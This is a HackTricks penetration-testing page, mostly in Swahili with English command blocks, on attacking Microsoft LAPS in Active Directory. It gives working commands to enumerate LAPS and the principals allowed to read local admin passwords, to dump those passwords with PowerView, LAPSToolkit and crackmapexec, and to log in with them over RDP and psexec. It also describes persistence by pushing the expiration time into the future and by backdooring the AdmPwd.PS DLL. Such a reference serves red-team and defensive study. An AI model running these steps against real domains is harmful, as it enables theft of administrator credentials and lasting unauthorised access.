# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

Local Administrator Password Solution (LAPS) ni chombo kinachotumika kwa usimamizi wa mfumo ambapo **administrator passwords**, ambazo ni **za kipekee, zilizopangwa kwa nasibu, na hubadilishwa mara kwa mara**, zinatumika kwa kompyuta zilizounganishwa na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinapatikana tu kwa watumiaji ambao wamepewa ruhusa kupitia Access Control Lists (ACLs). Usalama wa uhamasishaji wa nywila kutoka kwa mteja hadi seva unahakikishwa kwa kutumia **Kerberos version 5** na **Advanced Encryption Standard (AES)**.

Katika vitu vya kompyuta vya domain, utekelezaji wa LAPS unapelekea kuongeza sifa mbili mpya: **`ms-mcs-AdmPwd`** na **`ms-mcs-AdmPwdExpirationTime`**. Sifa hizi zinahifadhi **nywila ya msimamizi ya maandiko** na **wakati wake wa kuisha**, mtawalia.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

Moreover, the **native LAPS PowerShell cmdlets** can be used if they're installed on a machine we have access to:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** inaweza pia kutumika kugundua **nani anaweza kusoma nenosiri na kulisoma**:
```bash
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inarahisisha kuorodhesha LAPS hii kwa kazi kadhaa.\
Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zenye LAPS imewezeshwa.** Hii itaonyesha **makundi** yaliyotengwa mahsusi **kusoma nywila za LAPS**, ambazo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
**Akaunti** ambayo ime **unganishwa na kompyuta** kwenye kikoa inapata `All Extended Rights` juu ya mwenyeji huo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila.** Kuorodhesha kunaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Dumping LAPS Passwords With Crackmapexec**

Ikiwa hakuna ufikiaji wa powershell unaweza kutumia ruhusa hii kwa mbali kupitia LDAP kwa kutumia
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Hii itatoa nywila zote ambazo mtumiaji anaweza kusoma, ikikuruhusu kupata msingi mzuri na mtumiaji tofauti.

## ** Kutumia Nywila ya LAPS **
```
xfreerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistence**

### **Tarehe ya Kuisha**

Mara tu unapokuwa admin, inawezekana **kupata nywila** na **kuzuia** mashine isifanye **sasisho** la **nywila** kwa **kueka tarehe ya kuisha katika siku zijazo**.
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
> [!WARNING]
> Nenosiri bado litarejeshwa ikiwa **admin** atatumia cmdlet **`Reset-AdmPwdPassword`**; au ikiwa **Usiruhusu muda wa kuisha kwa nenosiri kuwa mrefu zaidi ya inavyohitajika na sera** imewezeshwa katika LAPS GPO.

### Backdoor

Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo inawezekana kuweka backdoor katika msimbo (ndani ya njia ya `Get-AdmPwdPassword` katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani **itaondoa nenosiri mpya au kuyahifadhi mahali fulani**.

Kisha, tu jenga upya `AdmPwd.PS.dll` mpya na uipakie kwenye mashine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe muda wa mabadiliko).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)


{{#include ../../banners/hacktricks-training.md}}
